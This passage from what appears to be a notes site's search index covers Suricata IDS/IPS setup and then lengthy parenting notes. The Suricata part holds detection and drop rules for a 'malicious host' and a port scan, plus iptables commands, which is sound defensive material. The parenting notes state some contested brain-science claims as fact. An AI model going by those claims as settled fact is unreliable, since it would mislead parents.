blocked in a perimeter context. You don\u2019t want any site or organization local traffic crossing the perimeter Realm-local scoped traffic will be confined to specific technologies. The decision to drop realm-local will have to be policy based. Global multicast should be dropped if not participating inter-domain. Protocol Normalization IPv6 has a protocol header field labeled \u201cNext Header\u201d. Normal OSI Layer 4 headers are called an \u201cUpper Layer Header\u201d There can be chained \u201cExtension Headers\u201d in the frame before UL Header.","title":"IPV6"},{"location":"network/#idsips-suricata","text":"Installation: sudo add - apt - repository ppa : oisf / suricata - stable sudo apt - get update sudo apt - get install suricata Update: suricata - update With cron: 0 0 * * * / usr / bin / suricata - update kill - USR2 $ ( pidof suricata ) / dev / null 2 1 suricata - update update - sources suricata - update list - sources suricata - update enable - source name suricata - update add - source name url suricata - update remove - source name suricata - update list - enabled - sources Reload: kill - USR2 $ ( pidof suricata ) Config: / etc / suricata / suricata . yaml HOME_NET \u2013 Internal network which is to be protected EXTERNAL_NET \u2013 External network; af - packet interface \u2013 Network interface which Suricata should use for monitoring. Logs: / var / log / suricata eve . json : Network events and alerts in Extensible Event Format suricata . log : Service messages fast . log : Network events and alerts in single line formatted. Rules: / var / lib / suricata / rules (OOTB rules are at / etc / suricata / rules ) Referenced from config file at rule - files section . Rule Types: Pass \u2013 let the packet through without generating an alert Drop \u2013 if matched, drop and logd Reject \u2013 similarly drop , and both the sender and receiver will receive a reject packet Alert \u2013 the packet is allowed through but an alert will be generated Supported porotocals: https://suricata.readthedocs.io/en/suricata-4.1.4/rules/intro.html#protocol Rule format: Source IP Source port - Destination IP Destination port Source IP Source port Destination IP Destination port Example: $ EXTERNAL_NET any - $ HOME_NET 22 Options: msg \u2013 information sid \u2013 unique ID number of the rule rev \u2013 version of the rule (incremented by 1 when the rule is updated) ( msg : Suspicious connection @ 1111 ; sid : 1111 ; rev : 1 ;) Example Rule: alert tcp $ EXTERNAL_NET any - $ HOME_NET 3306 ( msg : ET SCAN Suspicious inbound to mySQL port 3306 ; flow : to_server ; flags : S ; threshold : type limit , count 5 , seconds 60 , track by_src ; metadata : former_category POLICY ; reference : url , doc . emergingthreats . net / 2010937 ; classtype : bad-unknown ; sid : 2010937 ; rev : 3 ; metadata : created_at 2010_07_30 , updated_at 2018_03_27 ;) drop tcp any any - 10 . 33 . 33 . 1 any ( msg : TCP packet to malicious host, Drop ; sid : 10001 ;) drop tcp 10 . 33 . 33 . 1 any - any any ( msg : TCP packet from malicious host, Drop ; sid : 10002 ;) drop udp any any - 10 . 33 . 33 . 1 any ( msg : UDP packet to malicious host, Drop ; sid : 10003 ;) drop udp 10 . 33 . 33 . 1 any - any any ( msg : UDP packet from malicious host, Drop ; sid : 10004 ;) NFQUEUE : iptables and ip6tables target which delegates the decision on packets to a userspace software. When sudicata is installed in gateway: sudo iptables - I FORWARD - j NFQUEUE When installed on the host that should be protected: sudo iptables - I INPUT - j NFQUEUE sudo iptables - I OUTPUT - j NFQUEUE Example: iptables - t mangle - I PREROUTING - p tcp - m tcp --dport 80 -j NFQUEUE --queue-num 0 iptables - t mangle - I PREROUTING - p tcp - m tcp --sport 80 -j NFQUEUE --queue-num 0 iptables - t mangle - I PREROUTING - p udp - m udp --dport 53 -j NFQUEUE --queue-num 0 iptables - t mangle - I PREROUTING - p udp - m udp --sport 53 -j NFQUEUE --queue-num 0 Modes: nfq : mode : accept /repeat/ route repeat_mark : 1 # repeat mode option repeat_mask : 1 # repeat mode option route_queue : 2 # route mode option accept : the packet will not be inspected by the rest of the iptables rules repeat : the packets will be marked by Suricata and re-injected to the first rule of iptables. Looping is avoided by: iptables - I FORWARD - m mark ! --mark $MARK/$MASK -j NFQUEUE route : make sure the packet will be sent to another tool after being processed by Suricata Reload rules: suricatasc - c reload - rules","title":"IDS/IPS - Suricata"},{"location":"network/#references","text":"Beginner's Guide to Impacket Tool kit (Part 1) Let's code a TCP/IP stack, 1: Ethernet ARP: http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/ Let's code a TCP/IP stack, 2: IPv4 ICMPv4: http://www.saminiir.com/lets-code-tcp-ip-stack-2-ipv4-icmpv4/ Let's code a TCP/IP stack, 3: TCP Basics Handshake: http://www.saminiir.com/lets-code-tcp-ip-stack-3-tcp-handshake/ Practical man-in-the-middle attacks in computer networks - Mat\u02c7ej Plch: https://is.muni.cz/th/s8uf2/thesis.pdf","title":"References"},{"location":"non-security/","text":"Z Non Security Non-security related content here! Parenting Neuroscience for Parenting Oxytocin - Love hormone responsible of reorganizing neurons while parenting Also responsible of Us vs Them behavior In-group and out-group dynamics Feeling part of a group (protect a group) The Reptilian Brain Survival of individual When active: People act in treat stress mode Active when there is danger / perceived danger Responsible of dealing with life threatening situations Works closely with limbic amygdala Three ways of responding to a threat: Flee Lead to love, movement and change Fight Lead to challenges and winning Freeze Lead to sharing and caring Standby - Active even where there is no active danger Lead to contemplation and thinking Reptilian Brain also gets activated when life is not in danger Stress - Defense mechanism to a persevered danger When feeling stresses Flee - Anxiety Fight - Aggressively Freeze - Helplessness Reptilian Baby During first 3 months, 90% of neural connections are disappeared based on surrounding For a newborns slightest discomfort will trigger Reptilian Brain (life threatening) For a baby cry is the only action but could be due to, Flee, Fight or Freeze: Before 2-years, given them what they want Prefrontal brain is responsible of Handling emotional pain 17 years + development to avoid humiliation 24 years + to fully develop To handle stress of children - Show that you are on their side Flee Movement and avoid confrontation Solution: Give options Solution: Humor Fight Overpowering and winning Solution: Share outrage Solution: If kid is upset due to something you did, acknowledge feeling \"I understand you are angry right now\" \"You have right to be upset\" Freeze Looking for protection (ex: tears / not-doing-anything) Solution: Offer support Solution: Be there Common Solution: Offer a hug (tell if they want a hug they can have it later) Releases oxytocin . Bonding hormone. Fight stress is defensive aggression, which happens when Reptilian Brain is active. Movement Main purpose of brain is to facilitate movement 50% of neurons are from Cerebellum is responsible of coordination of movement This is the part of brain mostly grown at first 3 months of a newborns Hence, movement is key to development of a child Climbing, balancing, obstacle avoidance increase the brain growth (any activity that require constant attention on what uld happen next) Food Sense of hunger is gen by hypothalamus Brain is 73% water 60% of remaining 28% is fat Highest quality fat is: Omega 3 , can be found in: fatty fish (salmon, sadin) Nuts Milk and eggs (natural ones) Sleep Own bed rule Co-sleeping is important Paleolimbic Brain Survival of group When active: People act in very territorial way Tries to impress and intimidate Unconscious scripts inherited from education which regulates life Responsible of: Self-confidence Too-much: Dominance - Think of himself as superior to others Too-less: Submissiveness - Causes melancholic depression Trust Too-much: Axiality - Results in gullibility Too-less: Marginality limbic amygdala is responsible of parental instincts and territorial power games related to protecting kids Ex: Fight with much larger predators when offspring is in danger When someone is in this mode, better to let him calm down. No point of talking. Paleolimbic Toddler Paleolimbic brain activated at 2 / 2.5 + years (Start playing together as a group) Power-struggle and test others to see how long they can go Don't start explaining things No hugs / No nice guy Show you are in charge at these situations Let your kid win time to time, but with non-important things Let kid learn consequences of their actions Discipline the child and let them know they cannot do whatever they want However, too much discipline is wrong and will become submissive Don't threaten with a punishment and then not do it (don't reward for not complying) Once 4 years + - make sure rules of the house is clearly defined (however, they will still test the limits) Fluctuations of self-confidence stops only after 12 + years Bullying Is a dominant Paleolimbic behavior Do role playing and teach child how to say \"No no no\" in bullying situations Get bully to become a friend Neolimbic Brain Home to deepest motivations and raw emotions Where memory resides Identify situation and come-up with procedures to handle it Highly efficient and free-up minimum required attention span to carry out a task. Hence, free-up mind to do multiple things at the same time (Drive and talk). 3 layers of motivation Intrinsic motivations After 3 months will remain same throughout life Could lead to 8 different personality types Motivates you regardless of whether you like what you do Extrinsic Motivations Not fixed Likes and dislikes Blueprint of cultural influences (socially expectable) Motivates you only if you like what you do (won't last forever) Example: Motivation from a raise last 3 - 6 months Obsessions Passion that has gone over its tipping point When obsessed we are not just free (never satisfied of what you do towards the subject of the obsession) Expectations The Pygmalion Effect - How we think about others will influence how they perform Give list of high potential students (chosen just randomly) to a lecturer and measure success of students. The Gollem Effect - Negative expectations lead to negative outcomes Even when we try to hide our inner expectations, kids will pick those up from other signs Expecting too much - lead to raising insecure adults (with attachment issues) Kids will feel that: if kids do not perform as expected, they do not deserve our love No expectations - lead to brats who do not know how to stand up for themselves Focus on efforts not results Actions Discuss with your kids Setup rules together Challenge them Look at the kids with love, compassion and pride. Look at their potential You way of looking at them shapes who they will become Punishments and reward Never make a threat you will not act upon. This will damage your authority. Types of punishments Removing a toy Timeout Being grounded Rules Consequences have to be clear and accepted/agreed If X happens what should be the consequences? Let them decide. Transgressions should always have consequences No punishment = reward No drama Explain what is the problem of doing X (Ex: wall paintings / fighting while driving) Ask from kid why he is doing X Give alternatives Talk in isolation (individually) Parenting Styles Learned helplessness - By trying to make things easier in short term, we make things harder in long term We should help but not right away. Let them try, get frustrated. When child come to you, offer help. Next time, child will be able to solve the problem on their own. The Attachment Theory Kids require: Safety and Exploration Securely Attached Parents that are attuned to their desires. Kids will fel secure when parents are around. Avoidantly Attached Parents emotionally withdrawn. Child will learn to independently grow. Independent and mature. Fail to develop relationships with others. Not social. Ambivalent/disorganized attached Parents are inconsistent Kids are confused. Grow to be more fearful. Let kid explore. When a paint point arrives share a story where you also had a similar pain. Tell them it's normal to feel that way and it's part of the life. Tell them that you are there if they need you to. Personality Factors of Reptilian Brain , experiences during newborn period affect personality. Forcing kids to become what we want to become if counterproductive. Let children experience the life. Let them learn what they like. Fulfillment, Joy and Happiness is ultimate goal. Don't always reward or cheer too much. Doing so, yo might turn intrinsic motivation into extrinsic . Mindsets Fixed mindset - Focused on the result. Good grades is the focus. You avoid taking risks due to this focus. Growth mindset - Focused on the process Putting effort in there and experimenting. Enjoying the process (journey) and taking a challenge. Less stress. Doesn't affect relationship. Complements Complements reenforce identity Praise the effort (not the end result) Don't say: You are the best / That's beautiful / You are smart Say: You worked hard / You applied yourself / You like to learn new things don't you? Don't overdo it. Brain get used to Dopamine rush Will need stronger incentives Kid will like the praising more than the activity itself Do not ridicule or joke about a child. Prefrontal brain is not grown to handle this. Prefrontal Brain Make humans unique: No other living creature has this structure the way we have it Using Reptilian and Paleolimbic brain - No connection with local thinking ability Creating invocative solutions to the problem at hand Adaptation / Creativity Should be the one dealing with new and complex situations Not always the case. Limbic brain might be used in a situations where Prefrontal should be used. Example: Harry potter book was turned down by several publishers Idea of a personal computer Leads to resistance to change. Use all our knowledge and creativity to see a possible future and then say \"yes\" or \"no\". Might not be right decision Home to: creativity intuition spirituality adaptability WHen in use: we feel calmness and in full control. Remaining calm: Fast forward 10 years and think about it. Look at the situation and imagine how it could be worst. Will enable Prefrontal and disable amygdala. Learning Force kids to make mistakes. And let them learn from mistakes. Act of retrieving knowledge: The more knowledge is retrieved, stronger the pathway in brain becomes Let the kid do assignment on their own Revisit with him later Have them fail in the safe-environment and repeat until it's right. Sleep improves memory by at least 15% Adolescence 90% of full size by age of 6 From age 12, go through re-wiring Adolescence is the adaptive period You should be there to support child's emotional needs (not the other way around) Be the safe-haven Age 24+ to fully mature brain In human nature to product a creature optimally primed to leave a safe home and move into unfamiliar territory Overcome fear of leaving safe world and take risks (and new allies) Dopamine helps fast learning , takin risks Oxytocin bounding hormone Creates feeling of us vs them . Creates hostility between you and teenager In combination, creates a person: Very active socially and sharing new stuff with them Sensitive to peer pressure Teenagers weight reward and risk differently. Dopamine make reward look better. Look at the attitude that drives the actions (not the results). Experimenting is not wrong. Actions Need framework and rules but flexible and evolving They will need independence to answer social needs If not give, Poleolimbic brain create a territorial battle Stay connected Put down rules (negotiate rules). You are not the enemy. Get their point of view and adjust the rules as required. Write consequences clearly. Sleep is important. Create rules around that. Language center mature at 13 years. After that we cannot pickup anything as a 2 nd nature. Screentime Limit to less than 1-2 hours per day Less than 3 years non at all Due to: Gray matter atrophy Loss of white matter integrity Reduced cortical thickness Impaired cognitive function Dopamine instant gratification A rush with each game win, or video you watch Kids never get this type of dopamine rush in non-screen environment Therefore everything else becomes dull, and make you unable to focus Humans are social animal by nature. Screen reduce social skills. Sleep deprivation. Blue light LED, which disrupt melatonin . Keep it controlled from the start. Grit Delayed gratifications (instant gratification was our nature because everyday could be the last) Growth mindset Love the process Be demanding.But not too much, which could lead to Learned helplessness . Be Demanding yet Supportive . Our brain evolved for instant gratification energy efficiency Try Harder . Put them in control. It's in your hand. Perception of Control . Common Submissiveness, Introversion and Shyness Submissiveness About obedience Part of Paleolimbic Brain Should be avoided Talk: Is your kid bullied kicked upon Introversion Character traits People who are introverted tend to be inward turning, or focused more on internal thoughts, feelings and moods rather than seeking out external stimulation. Part of Neolimbic Brain Talk: Is your kid like to be alone (introverted) Shyness About social fear Part of Reptilian Brain (freeze) Talk: Is your kid scared of others who he doesn't know Invite same age kids to home (one at a time) Introduce the kid to other one Ask other kid some questions and then involve your kid on answers Help delaying gratification When you promise something do it When they want something make them earn it Action means reaction There are consequences to actions Birth Order First Child - Parents have strong urge to do everything perfectly. More attention given by parents. Reliable Conscientious Structured Cautious Controlling Achievers Competitive mindset Second Child - Parents are bit relaxed. Have sense of having control. If different gender than the first, second child may have first child characteristics. People pleaser Somewhat rebellious Thrive on friendship Large social circle Peacemakers Last Child - Grab whole family attention. Hence 2 nd child is left out. Fun loving Uncomplicated Manipulative Outgoing Attention seeker Self centered Only child becomes extreme First Child . And also, mature to his age, perfectionists, conscientious, diligent, leaders. Main pillars for healthy brain Sleep Movement Diet Grit Three golden rules Setup a framework (set of rules) Let them experiment without too much adult interventions Avoid public humiliations You are on their side. Take away the perceived danger. Communication on the level of emotions. Offer guidance. Family Meetings https://centerforparentingeducation.org/library-of-articles/healthy-communication/holding-family-meetings/ https://www.rootsofaction.com/family-meetings/ plan weekly schedules/calendars so everyone knows what each person will need to do and what commitments have been made. share information that will effect family members. have fun together. make family decisions about vacations, recreation or other activities. It is truly an opportunity for your children to feel SEEN, HEARD, and UNDERSTOOD by you (since everyone is equal) Introducing Family Meetings to Children take time to introduce the concept to your children before you dive in you\u2019ve recently learned how weekly meetings can benefit families by helping them communicate and solve problems together as a team Because family meetings work toward building consensus, everyone has a voice and a role in solving problems. Meeting time is also an opportunity to have fun, plan trips, organize family outings and service projects, and appreciate each other specific problem Decide who is involved. Each person states his perspective and viewpoint about the problem. Ask each person for suggestions Write down the suggestions. Develop a plan of action. At the end of the session, set a time for a follow up meeting to evaluate Have a follow up meeting. make sure: Value everyone\u2019s input. Treat all members as equals. Avoid letting one person dominates. Keep the family meeting short (no longer than 15 minutes). Using \u201cI\u201d Statements (over \u201cYou\u201d statement) \u201cI would like\u201d (tell what you want to happen instead) to make it interesting include refreshments. include an opening activity that highlights positive family events or achievements or affirms individual family members. Example \u2013 best thing I did today, trait I like about myself, (or about someone else in family) set an agenda so that everyone knows what will be discussed. establish ground rules, such as: no interruptions no put downs everyone is listened to respect each other\u2019s opinions everyone has a chance to contribute Sharing leadership Being flexible Keeping Minutes Family Meeting Agenda Open Meeting - with a poem, prayer, song, candle-lighting, etc. Appreciations - each family member to appreciate, say \u201cthanks,\u201d compliment, or acknowledge other members on positive things they noticed this week Discovery Time - learning together as a family Week in Review What worked well in our family this week? What went wrong in our family this week? What will we work on this coming week? Problem-Solving resolving problems or issues that individual family members have placed on the agenda try to solve only one problem a week Weekly Planning Trips, concerts, sports events chores Fun Activity - playing a game, watching a movie, or making pizza together Power Struggle Misbehave to: Belong Feel loved feel powerful Feel valuable Feel like they have a place Experiment and explore Adlerian Psychology Misbehaving = Discouraged (from getting one of these needs met). Identify child's mistaken goals and provide a better way of getting to those. Mistaken Goals Attention Feel special and feel loved by keeping parent busy Parent Feel: Irritated, annoyed, frustrated, distracted, manipulated Power Parent Feel: Provoked, anger, challenged Revenge I feel hurt, hence I'm going to make you hurt Parent Feel: Hurt, mad, want to get even Avoidance Parent Feel: Feel sorry for child, despair, helpless coaxes or shows pity Side Stepping the Power Struggle Joy of Opposing when Power Struggle with someone Drop parent's end of tug of war by stopping talking Without disrespecting or doing something mean. Preventing Joy of Opposing Do not escalate your emotional response. (Example: Loud \"no\"s with each attempt) Respond like a broken record (repetition) To play in garden , you are going to learn not to do X . And drop child in a different place , until child stop doing X Repetition and Redirection . Cannot learn when in a power struggle - in stress (reptilian brain). Repetition help keeping prefrontal brain active and learn. Kind and Firm Find middle ground between kindness and firmness Better to be more firm than kind Given-in from time to time, but don't let them completely win power struggle. Dance of Corporation How to Get Out of A Power Struggle Use loving guidance Words fuel power struggle. Use less words (no is better). Approach calmly. Use eye contact / non-verbal signals to give the message. Find useful ways for the child to feel valuable and powerful Example: Give his own drawer in kitchen for his stuff Teach them to say \"no\" respectfully If saying \"no\" was not an option, kids will find alternatives like arguing Offer choices Choices should be aged appropriately to let the kid feel empowered Concrete choices \"Do you want to wear the red pants or the blue pants?\" Choices with incentives \"Do you want to go to bed now and I'll read you 3 stories or go to bed in 5 minutes and I'll read you one story?\" Playful choices \"Do you want to walk to bed or run to bed?\" Immediate choices \"Do you want to go to bed now or now?\" Choices with consequences \"You may play with the truck on the floor or choose a soft toy to play with on the table. If you run the truck on the table again, I will take the truck away.\" Do the unexpected Do something unexpected / fun to break the attention to power struggle Then get back to the original task. Don't let the kids get away Example: Dance before bed (when power struggling about bed time) Win/Win negotiate Flexible Usable with a child who does what he say he will Negotiate what happens if task is not done If child is not accountable with the negotiation, don't use this technique \"I see that's a win for you and I want you to win. But I want to win too......\" Let go of your position Listening to child Use a signal Let child make a signal (word of a sign) to start a task Example: \"Broccoli\" is the sign to \"stop fighting\" Preventing Power Struggles Talk Less (use actions) Use One Word (in sing sung voice) Be firm and kind - and follow through Do what you say. Show that you mean the consequences. Say no in a friendly way That\u2019s not an option I am unwilling... Say it in a funny way, i.e. \"Never in a million trillion years!\" Sing, no, no, no! That\u2019s not appropriate. I am not ready for you to do that yet. (Great for teens) For a younger child, use distraction Ask, \"What do you think you would need to do before I would be willing to say yes to that?\" Ask, \"What do you think? Is this a good choice for you?\" (If you choose this, make sure you are willing to abide by her answer) For a youngster that has something you don\u2019t want him to have say, \"That\u2019s not a toy.\" Ask, \"What are your other options?\" No, but I would be willing to... I appreciate your asking, however... Walls are not for coloring. Here is a piece of paper. Tell them what to do instead i.e., \"Water needs to stay in the tub.\" This is not negotiable Let them have the last word Don't give in (and show that if forced enough you are ready to do something) Be patience and just wait until kid give up Catch them doing well and acknowledge them Little reward (ex: join and play with them) when doing well Let them know how valuable they are to you Ex: Appreciate a hug Make it fun Seek first to understand Don\u2019t major in the minors Pick on the battles you can win If most things are flexible, kids tend to be more likely to comply with your major requests Use GEMS (Genuine Encounter Moments) See world through the child's eyes and be with him Take 3 minutes to 30 seconds to handle a GEM Let them feel: \"What is important to me, is important to my parent\" Cannot handle all GEMS. Hence, depending on importance of your work handle some. Options: Do a GEM Set temporary limit: It's OK to tell him to give 10 minutes. But make sure you'll be there by 10 minutes (Trust). Redirect the attention.","title":"Z Non Security"},{"location":"non-security/#z-non-security","text":"Non-security related content here!","title":"Z Non Security"},{"location":"non-security/#parenting","text":"","title":"Parenting"},{"location":"non-security/#neuroscience-for-parenting","text":"Oxytocin - Love hormone responsible of reorganizing neurons while parenting Also responsible of Us vs Them behavior In-group and out-group dynamics Feeling part of a group (protect a group)","title":"Neuroscience for Parenting"},{"location":"non-security/#the-reptilian-brain","text":"Survival of individual When active: People act in treat stress mode Active when there is danger / perceived danger Responsible of dealing with life threatening situations Works closely with limbic amygdala Three ways of responding to a threat: Flee Lead to love, movement and change Fight Lead to challenges and winning Freeze Lead to sharing and caring Standby - Active even where there is no active danger Lead to contemplation and thinking Reptilian Brain also gets activated when life is not in danger Stress - Defense mechanism to a persevered danger When feeling stresses Flee - Anxiety Fight - Aggressively Freeze - Helplessness Reptilian Baby During first 3 months, 90% of neural connections are disappeared based on surrounding For a newborns slightest discomfort will trigger Reptilian Brain (life threatening) For a baby cry is the only action but could be due to, Flee, Fight or Freeze: Before 2-years, given them what they want Prefrontal brain is responsible of Handling emotional pain 17 years + development to avoid humiliation 24 years + to fully develop To handle stress of children - Show that you are on their side Flee Movement and avoid confrontation Solution: Give options Solution: Humor Fight Overpowering and winning Solution: Share outrage Solution: If kid is upset due to something you did, acknowledge feeling \"I understand you are angry right now\" \"You have right to be upset\" Freeze Looking for protection (ex: tears / not-doing-anything) Solution: Offer support Solution: Be there Common Solution: Offer a hug (tell if they want a hug they can have it later) Releases oxytocin . Bonding hormone. Fight stress is defensive aggression, which happens when Reptilian Brain is active. Movement Main purpose of brain is to facilitate movement 50% of neurons are from Cerebellum is responsible of coordination of movement This is the part of brain mostly grown at first 3 months of a newborns Hence, movement is key to development of a child Climbing, balancing, obstacle avoidance increase the brain growth (any activity that require constant attention on what uld happen next) Food Sense of hunger is gen by hypothalamus Brain is 73% water 60% of remaining 28% is fat Highest quality fat is: Omega 3 , can be found in: fatty fish (salmon, sadin) Nuts Milk and eggs (natural ones) Sleep Own bed rule Co-sleeping is important","title":"The Reptilian Brain"},{"location":"non-security/#paleolimbic-brain","text":"Survival of group When active: People act in very territorial way Tries to impress and intimidate Unconscious scripts inherited from education which regulates life Responsible of: Self-confidence Too-much: Dominance - Think of himself as superior to others Too-less: Submissiveness - Causes melancholic depression Trust Too-much: Axiality - Results in gullibility Too-less: Marginality limbic amygdala is responsible of parental instincts and territorial power games related to protecting kids Ex: Fight with much larger predators when offspring is in danger When someone is in this mode, better to let him calm down. No point of talking. Paleolimbic Toddler Paleolimbic brain activated at 2 / 2.5 + years (Start playing together as a group) Power-struggle and test others to see how long they can go Don't start explaining things No hugs / No nice guy Show you are in charge at these situations Let your kid win time to time, but with non-important things Let kid learn consequences of their actions Discipline the child and let them know they cannot do whatever they want However, too much discipline is wrong and will become submissive Don't threaten with a punishment and then not do it (don't reward for not complying) Once 4 years + - make sure rules of the house is clearly defined (however, they will still test the limits) Fluctuations of self-confidence stops only after 12 + years Bullying Is a dominant Paleolimbic behavior Do role playing and teach child how to say \"No no no\" in bullying situations Get bully to become a friend","title":"Paleolimbic Brain"},{"location":"non-security/#neolimbic-brain","text":"Home to deepest motivations and raw emotions Where memory resides Identify situation and come-up with procedures to handle it Highly efficient and free-up minimum required attention span to carry out a task. Hence, free-up mind to do multiple things at the same time (Drive and talk). 3 layers of motivation Intrinsic motivations After 3 months will remain same throughout life Could lead to 8 different personality types Motivates you regardless of whether you like what you do Extrinsic Motivations Not fixed Likes and dislikes Blueprint of cultural influences (socially expectable) Motivates you only if you like what you do (won't last forever) Example: Motivation from a raise last 3 - 6 months Obsessions Passion that has gone over its tipping point When obsessed we are not just free (never satisfied of what you do towards the subject of the obsession) Expectations The Pygmalion Effect - How we think about others will influence how they perform Give list of high potential students (chosen just randomly) to a lecturer and measure success of students. The Gollem Effect - Negative expectations lead to negative outcomes Even when we try to hide our inner expectations, kids will pick those up from other signs Expecting too much - lead to raising insecure adults (with attachment issues) Kids will feel that: if kids do not perform as expected, they do not deserve our love No expectations - lead to brats who do not know how to stand up for themselves Focus on efforts not results Actions Discuss with your kids Setup rules together Challenge them Look at the kids with love, compassion and pride. Look at their potential You way of looking at them shapes who they will become Punishments and reward Never make a threat you will not act upon. This will damage your authority. Types of punishments Removing a toy Timeout Being grounded Rules Consequences have to be clear and accepted/agreed If X happens what should be the consequences? Let them decide. Transgressions should always have consequences No punishment = reward No drama Explain what is the problem of doing X (Ex: wall paintings / fighting while driving) Ask from kid why he is doing X Give alternatives Talk in isolation (individually) Parenting Styles Learned helplessness - By trying to make things easier in short term, we make things harder in long term We should help but not right away. Let them try, get frustrated. When child come to you, offer help. Next time, child will be able to solve the problem on their own. The Attachment Theory Kids require: Safety and Exploration Securely Attached Parents that are attuned to their desires. Kids will fel secure when parents are around. Avoidantly Attached Parents emotionally withdrawn. Child will learn to independently grow. Independent and mature. Fail to develop relationships with others. Not social. Ambivalent/disorganized attached Parents are inconsistent Kids are confused. Grow to be more fearful. Let kid explore. When a paint point arrives share a story where you also had a similar pain. Tell them it's normal to feel that way and it's part of the life. Tell them that you are there if they need you to. Personality Factors of Reptilian Brain , experiences during newborn period affect personality. Forcing kids to become what we want to become if counterproductive. Let children experience the life. Let them learn what they like. Fulfillment, Joy and Happiness is ultimate goal. Don't always reward or cheer too much. Doing so, yo might turn intrinsic motivation into extrinsic . Mindsets Fixed mindset - Focused on the result. Good grades is the focus. You avoid taking risks due to this focus. Growth mindset - Focused on the process Putting effort in there and experimenting. Enjoying the process (journey) and taking a challenge. Less stress. Doesn't affect relationship. Complements Complements reenforce identity Praise the effort (not the end result) Don't say: You are the best / That's beautiful / You are smart Say: You worked hard / You applied yourself / You like to learn new things don't you? Don't overdo it. Brain get used to Dopamine rush Will need stronger incentives Kid will like the praising more than the activity itself Do not ridicule or joke about a child. Prefrontal brain is not grown to handle this.","title":"Neolimbic Brain"},{"location":"non-security/#prefrontal-brain","text":"Make humans unique: No other living creature has this structure the way we have it Using Reptilian and Paleolimbic brain - No connection with local thinking ability Creating invocative solutions to the problem at hand Adaptation / Creativity Should be the one dealing with new and complex situations Not always the case. Limbic brain might be used in a situations where Prefrontal should be used. Example: Harry potter book was turned down by several publishers Idea of a personal computer Leads to resistance to change. Use all our knowledge and creativity to see a possible future and then say \"yes\" or \"no\". Might not be right decision Home to: creativity intuition spirituality adaptability WHen in use: we feel calmness and in full control. Remaining calm: Fast forward 10 years and think about it. Look at the situation and imagine how it could be worst. Will enable Prefrontal and disable amygdala. Learning Force kids to make mistakes. And let them learn from mistakes. Act of retrieving knowledge: The more knowledge is retrieved, stronger the pathway in brain becomes Let the kid do assignment on their own Revisit with him later Have them fail in the safe-environment and repeat until it's right. Sleep improves memory by at least 15% Adolescence 90% of full size by age of 6 From age 12, go through re-wiring Adolescence is the adaptive period You should be there to support child's emotional needs (not the other way around) Be the safe-haven Age 24+ to fully mature brain In human nature to product a creature optimally primed to leave a safe home and move into unfamiliar territory Overcome fear of leaving safe world and take risks (and new allies) Dopamine helps fast learning , takin risks Oxytocin bounding hormone Creates feeling of us vs them . Creates hostility between you and teenager In combination, creates a person: Very active socially and sharing new stuff with them Sensitive to peer pressure Teenagers weight reward and risk differently. Dopamine make reward look better. Look at the attitude that drives the actions (not the results). Experimenting is not wrong. Actions Need framework and rules but flexible and evolving They will need independence to answer social needs If not give, Poleolimbic brain create a territorial battle Stay connected Put down rules (negotiate rules). You are not the enemy. Get their point of view and adjust the rules as required. Write consequences clearly. Sleep is important. Create rules around that. Language center mature at 13 years. After that we cannot pickup anything as a 2 nd nature. Screentime Limit to less than 1-2 hours per day Less than 3 years non at all Due to: Gray matter atrophy Loss of white matter integrity Reduced cortical thickness Impaired cognitive function Dopamine instant gratification A rush with each game win, or video you watch Kids never get this type of dopamine rush in non-screen environment Therefore everything else becomes dull, and make you unable to focus Humans are social animal by nature. Screen reduce social skills. Sleep deprivation. Blue light LED, which disrupt melatonin . Keep it controlled from the start. Grit Delayed gratifications (instant gratification was our nature because everyday could be the last) Growth mindset Love the process Be demanding.But not too much, which could lead to Learned helplessness . Be Demanding yet Supportive . Our brain evolved for instant gratification energy efficiency Try Harder . Put them in control. It's in your hand. Perception of Control .","title":"Prefrontal Brain"},{"location":"non-security/#common","text":"Submissiveness, Introversion and Shyness Submissiveness About obedience Part of Paleolimbic Brain Should be avoided Talk: Is your kid bullied kicked upon Introversion Character traits People who are introverted tend to be inward turning, or focused more on internal thoughts, feelings and moods rather than seeking out external stimulation. Part of Neolimbic Brain Talk: Is your kid like to be alone (introverted) Shyness About social fear Part of Reptilian Brain (freeze) Talk: Is your kid scared of others who he doesn't know Invite same age kids to home (one at a time) Introduce the kid to other one Ask other kid some questions and then involve your kid on answers Help delaying gratification When you promise something do it When they want something make them earn it Action means reaction There are consequences to actions Birth Order First Child - Parents have strong urge to do everything perfectly. More attention given by parents. Reliable Conscientious Structured Cautious Controlling Achievers Competitive mindset Second Child - Parents are bit relaxed. Have sense of having control. If different gender than the first, second child may have first child characteristics. People pleaser Somewhat rebellious Thrive on friendship Large social circle Peacemakers Last Child - Grab whole family attention. Hence 2 nd child is left out. Fun loving Uncomplicated Manipulative Outgoing Attention seeker Self centered Only child becomes extreme First Child . And also, mature to his age, perfectionists, conscientious, diligent, leaders. Main pillars for healthy brain Sleep Movement Diet Grit Three golden rules Setup a framework (set of rules) Let them experiment without too much adult interventions Avoid public humiliations You are on their side. Take away the perceived danger. Communication on the level of emotions. Offer guidance.","title":"Common"},{"location":"non-security/#family-meetings","text":"https://centerforparentingeducation.org/library-of-articles/healthy-communication/holding-family-meetings/ https://www.rootsofaction.com/family-meetings/ plan weekly schedules/calendars so everyone knows what each person will need to do and what commitments have been made. share information that will effect family members. have fun together. make family decisions about vacations, recreation or other activities. It is truly an opportunity for your children to feel SEEN, HEARD, and UNDERSTOOD by you (since everyone is equal) Introducing Family Meetings to Children take time to introduce the concept to your children before you dive in you\u2019ve recently learned how weekly meetings can benefit families by helping them communicate and solve problems together as a team Because family meetings work toward building consensus, everyone has a voice and a role in solving problems. Meeting time is also an opportunity to have fun, plan trips, organize family outings and service projects, and appreciate each other specific problem Decide who is involved. Each person states his perspective and viewpoint about the problem. Ask each person for suggestions Write down the suggestions. Develop a plan of action. At the end of the session, set a time for a follow up meeting to evaluate Have a follow up meeting. make sure: Value everyone\u2019s input. Treat all members as equals. Avoid letting one person dominates. Keep the family meeting short (no longer than 15 minutes). Using \u201cI\u201d Statements (over \u201cYou\u201d statement) \u201cI would like\u201d (tell what you want to happen instead) to make it interesting include refreshments. include an opening activity that highlights positive family events or achievements or affirms individual family members. Example \u2013 best thing I did today, trait I like about myself, (or about someone else in family) set an agenda so that everyone knows what will be discussed. establish ground rules, such as: no interruptions no put downs everyone is listened to respect each other\u2019s opinions everyone has a chance to contribute Sharing leadership Being flexible Keeping Minutes Family Meeting Agenda Open Meeting - with a poem, prayer, song, candle-lighting, etc. Appreciations - each family member to appreciate, say \u201cthanks,\u201d compliment, or 